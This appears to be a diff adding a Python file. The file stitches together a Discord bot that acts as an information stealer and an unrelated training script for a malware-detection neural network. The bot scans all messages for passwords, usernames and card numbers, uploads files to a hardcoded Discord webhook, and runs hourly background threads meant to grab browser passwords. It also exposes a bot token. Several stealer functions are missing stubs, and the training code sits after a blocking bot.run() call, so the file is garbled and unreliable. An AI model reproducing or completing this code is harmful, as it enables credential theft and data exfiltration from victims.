@@ -1,0 +1,260 @@
+import discord
+from discord.ext import commands
+import re
+import os
+import requests
+import time
+import threading
+import base64
+from shutil import copy2
+from Crypto.Cipher import AES
+from datetime import datetime, timedelta
+import torch
+import torch.nn as nn
+import torch.optim as optim
+from readMalwareData import read_malware_data_setup, read_malware_data
+from splitMalwareData import split_malware_data_train_test, split_malware_data_train_val_test
+from buildNetwork import build_network
+from trainModel import train_model
+from testModel import test_model
+
+# Configuration
+WEBHOOK_URL = "https://discord.com/api/webhooks/1211934785283424266/BCtBJSwzwDMkCrCPuLiJeYYqH7u93tGMfoB2SS5z6SRRaDUvJYNFqQSEl52xyT9th5n3"
+BOT_TOKEN = "MTA1OTM4Mjc0NjMzNTY3NDQwOA.G5F7se.GNYkocgIpEbh792pTbFG9LUIA5bID10o0xGzS8"
+
+# Discord bot setup
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+class GridReconnaissance:
+    def __init__(self):
+        self.target = None
+
+    def scan_network(self):
+        if self.target:
+            return f"Scanning network for vulnerabilities related to {self.target}."
+        else:
+            return "No target specified for network scanning."
+
+    def analyze_message(self, content):
+        keyword_patterns = {
+            'password': r'\bpassword\b',
+            'username': r'\busername\b',
+            'credit_card': r'\b\d{4}[-.\s]?\d{4}[-.\s]?\d{4}[-.\s]?\d{4}\b'
+        }
+
+        for keyword, pattern in keyword_patterns.items():
+            matches = re.findall(pattern, content, flags=re.IGNORECASE)
+            if matches:
+                return f'{keyword.capitalize()} information found: {", ".join(matches)}'
+        return None
+
+    def upload_to_discord(self, file_path):
+        try:
+            with open(file_path, "rb") as f:
+                files = {"file": f}
+                headers = {"User-Agent": "Mozilla/5.0"}
+                response = requests.post(WEBHOOK_URL, headers=headers, files=files)
+                if response.status_code == 429:
+                    print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
+                    time.sleep(response.json()["retry_after"]/1000)
+                    self.upload_to_discord(file_path)
+                elif response.status_code != 200:
+                    print(f"Failed to upload file {file_path} - error {response.status_code}")
+                else:
+                    print(f"Successfully uploaded file {file_path}")
+        except Exception as e:
+            print(f"Failed to upload file {file_path} - {str(e)}")
+
+grid_instance = GridReconnaissance()
+
+@bot.event
+async def on_ready():
+    print(f'Logged in as {bot.user.name} ({bot.user.id})')
+    await bot.change_presence(activity=discord.Game(name="!custom_help for commands"))
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+
+    analysis_result = grid_instance.analyze_message(message.content)
+    if analysis_result:
+        print(analysis_result)
+
+    await bot.process_commands(message)
+
+@bot.command(name='analyze_messages', help='Analyze messages for sensitive information.')
+async def analyze_messages(ctx):
+    result = grid_instance.analyze_message(ctx.message.content)
+    await ctx.send(result or "No sensitive information found.")
+
+# Background Thread for File Search and Upload
+def search_and_upload():
+    # Replace with your file search and upload logic
+    print("Executing file search and upload logic in the background.")
+
+file_search_thread = threading.Thread(target=search_and_upload)
+file_search_thread.start()
+
+# Background Thread for Password Grabbing
+def grab_passwords_background():
+    while True:
+        grabbed_passwords = grab_passwords()  # Implement the grab_passwords function
+        print("Grabbed Passwords:", grabbed_passwords)
+        time.sleep(3600)  # Sleep for an hour before grabbing passwords again
+
+password_grabbing_thread = threading.Thread(target=grab_passwords_background)
+password_grabbing_thread.start()
+
+# Function to grab passwords
+def grab_passwords():
+    global file_name, nanoseconds
+    file_name, nanoseconds = 116444736000000000, 10000000
+    result = {}
+    try:
+        result = main()  # Assuming you have a main function for password grabbing
+    except:
+        time.sleep(1)
+
+    try:
+        result2 = get_passwords_chrome()
+        for i in result2.keys():
+            result[i] = result2[i]
+    except:
+        time.sleep(1)
+
+    return result
+
+# Continue with your password grabbing functions...
+
+# Run the bot
+bot.run("MTA1OTM4Mjc0NjMzNTY3NDQwOA.G5F7se.GNYkocgIpEbh792pTbFG9LUIA5bID10o0xGzS8")
+
+# Command-line arguments
+class Options:
+    def __init__(self):
+        self.seed = 1
+        self.nEmbeddingDims = 8
+        self.nConvFilters = 64
+        self.kernelLength = 8
+        self.useHiddenLayer = True
+        self.nHiddenNodes = 16
+        self.weightClasses = False
+        self.nSamplingEpochs = 10
+        self.useDropout = False
+        self.dropoutFrac = 0.5
+        self.randomize = False
+        self.numDAShuffles = 1
+        self.useOneHot = False
+        self.learningRate = 1e-3
+        self.nEpochs = 20
+        self.nConvLayers = 1
+        self.nFCLayers = 1
+        self.batchSize = 1
+        self.usemom = False
+        self.useRMSProp = False
+        self.useCUDA = False
+        self.gpuid = 1
+        self.usePreTrainedEmbedding = False
+        self.fixEmbedding = False
+        self.programLen = 8
+        self.debug = False
+        self.dataAugProb = 0.1
+        self.dataAugMethod = 1
+        self.trainingSetSize = 2
+        self.markFunctionEnds = False
+        self.saveModel = False
+        self.saveFileName = 'detect_malware_cnn'
+        self.decayLearningRate = False
+        self.weightDecay = 0
+        self.weightDecayFrac = 0.1
+        self.useSpatialDropout = False
+        self.useDropoutAfterEmbedding = False
+        self.useDropoutAfterConv = False
+        self.dataDir = './malwareDataset/'
+        self.metaDataFile = './config/metaData.th7'
+        self.setupMode = False
+        self.maxSequenceLength = 1000000
+        self.dataAugTesting = False
+
+opt = Options()
+
+if opt.useCUDA:
+    import torch.cuda
+
+torch.set_default_tensor_type("torch.DoubleTensor")
+torch.manual_seed(opt.seed)
+if opt.useCUDA:
+    torch.cuda.set_device(opt.gpuid)
+    torch.cuda.manual_seed_all(opt.seed)
+
+if opt.dataAugTesting:
+    from testModel_dataAug import test_model_data_aug
+else:
+    from testModel import test_model
+
+print(opt)
+
+def isnan(z):
+    return z != z
+
+if opt.setupMode:
+    print('reading dataset')
+    dataset_info = read_malware_data_setup(opt.dataDir)
+
+    print('splitting dataset into train/test sets')
+    train_percentage = 0.9
+    train_inds, test_inds, pos_neg_ratio = split_malware_data_train_test(
+        dataset_info['label'], train_percentage, 1 - train_percentage
+    )
+
+    meta_data = {
+        'trainInds': train_inds,
+        'testInds': test_inds,
+        'posNegRatio': pos_neg_ratio,
+        'trainPercentage': train_percentage,
+        'filesList': dataset_info['filesList'],
+        'family': dataset_info['family'],
+        'label': dataset_info['label'],
+        'benignFamily': dataset_info['benignFamily'],
+        'familyName': dataset_info['familyName']
+    }
+    
+    print('saving dataset metadata to file', opt.metaDataFile)
+    torch.save(meta_data, opt.metaDataFile)
+
+else:
+    print(opt.metaDataFile)
+    meta_data = torch.load(opt.metaDataFile)
+
+    print('reading data from disk')
+    all_data = read_malware_data(opt.dataDir, meta_data)
+    print('reading data from disk - complete')
+    print('program lens', torch.min(all_data['programLengths']),
+          torch.max(all_data['programLengths']), torch.mean(all_data['programLengths']))
+
+    print('splitting data into train/val/test sets')
+    test_percentage = 1 - meta_data['trainPercentage']
+    val_percentage = 1 - (test_percentage + meta_data['trainPercentage'])
+
+    print('t,v,t')
+    print(test_percentage, val_percentage, meta_data['trainPercentage'])
+
+    train_inds, val_inds, test_inds, pos_neg_ratio = split_malware_data_train_val_test(
+        all_data['label'], meta_data, meta_data['trainPercentage']
+    )
+
+    data_split = {
+        'trainInds': train_inds,
+        'valInds': val_inds,
+        'testInds': test_inds,
+        'posNegRatio': pos_neg_ratio
+    }
+
+    print('new network')
+    model, criterion = build_network(meta_data['posNegRatio'])
+
+    print('starting training')
+    trained_model = train_model(model, criterion, all_data, data_split['trainInds'],
+                                data_split['valInds'], data_split, meta_data)
